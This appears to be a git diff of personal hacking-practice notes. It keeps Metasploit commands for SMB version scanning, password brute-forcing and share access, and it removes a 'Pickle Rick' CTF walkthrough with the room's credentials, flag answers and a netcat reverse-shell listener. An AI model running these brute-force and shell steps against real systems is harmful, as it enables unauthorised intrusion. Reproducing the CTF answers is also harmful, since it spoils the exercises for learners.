@@ -13,57 +13,18 @@ cd ~/Documents/project/metasploit-framework && git pull origin master && msfupda
 
 msfconsole
 use auxiliary/scanner/smb/smb_version
-run smb://111.111.111.111
+run smb://127.0.0.1
 use  auxiliary/scanner/smb/smb_login
 search session_type:smb
 search smb
 sudo nano /usr/share/sqlmap/data/txt/wordlist.txt
-run -q CreateSession=true RHOSTS=111.111.111.111 RPORT=445 SMBUser=windows pass_file=/usr/share/sqlmap/data/txt/wordlist.txt threads=50
+run -q CreateSession=true RHOSTS=127.0.0.1 RPORT=445 SMBUser=windows pass_file=/usr/share/sqlmap/data/txt/wordlist.txt threads=50
 
 sessions -i -1
 shares
 shares -i D$
 
 sudo find / -name 'wordlist.txt'
-
-Pickle Rick
-sudo apt install nmap
-nmap -v
-
-sudo nmap 10.10.144.156 -A -T 4 -v -oN scan_results
-nano scan_results
-
-navigate to http://10.10.144.156
-sudo find / -name 'directory-list-2.3-medium.txt'
-gobuster dir -u http://10.10.144.156/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
-
-R1ckRul3s
-Wubbalubbadubdub
-
-On command panel
-ls -a
-
-http://10.10.144.156/Sup3rS3cretPickl3Ingred.txt
-mr. meeseek hair
-
-cat clue.txt
-tac clue.txt
-
-ls -al /home
-ls -al /home/rick
-tac /home/rick/second\ ingredients
-1 jerry tear
-sudo ls -al /root
-sudo tac /root/3rd.txt
-
-which python3
-/usr/bin/python3
-
-nc -lvnp 1234
-whoami
-www-data
-
-
 
 https://app.hackthebox.com/competitive/5/overview
 10.10.11.20
